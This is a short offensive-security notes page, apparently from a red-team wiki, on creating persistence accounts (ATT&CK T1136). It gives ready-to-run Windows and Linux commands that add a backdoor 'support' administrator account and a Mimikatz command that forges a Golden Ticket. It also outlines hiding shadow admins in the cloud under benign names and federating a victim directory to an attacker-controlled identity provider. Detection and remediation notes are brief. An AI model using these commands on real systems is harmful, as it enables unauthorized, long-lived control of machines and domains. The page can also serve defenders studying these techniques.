---
title: Create Account
tags: [persistence, accounts, golden-ticket, domain-admin]
description: Creating backdoor accounts or generating Golden Tickets for permanent domain dominance.
date: 2024-01-02
---

# Create Account (T1136)

Simply adding a user "support" to the "Administrators" group.

## 1. Local Account
Persistence on a single machine.

```bash
# Windows
net user support Winter2024! /add
net localgroup Administrators support /add

# Linux
useradd -m support
usermod -aG sudo support
```
*Detection*: Very easy. "New user created" event ID 4720.

## 2. Domain Account (Golden Ticket)
The ultimate persistence. If you compromise the Domain Controller, you don't need to create a user. You forging a Ticket.

### The Golden Ticket (T1558.001)
You steal the `krbtgt` account's NTLM hash. With this, you can sign your own Kerberos User Tickets (TGT).
- **User**: "FakeAdmin" (Doesn't need to exist).
- **Groups**: "Domain Admins".
- **Expiry**: 10 Years.

**Forge Command (Mimikatz)**:
```text
kerberos::golden /user:FakeUser /domain:target.com /sid:S-1-5-21-... /krbtgt:HASH /id:500
```

**Result**: You have a valid TGT. You can access any resource in the domain as Admin, even if you change every password. The only fix is to rotate the `krbtgt` password (twice).

## 3. Cloud Accounts
Creating an API-only user in AWS IAM or Azure AD.
- **Shadow Admin**: Create a user with extensive permissions but a benign name (`backup-service`).
- **Federated Trust**: Create a trust relationship between the victim Access Directory and your own attacker Controlled IDP. You can then log in as anyone.
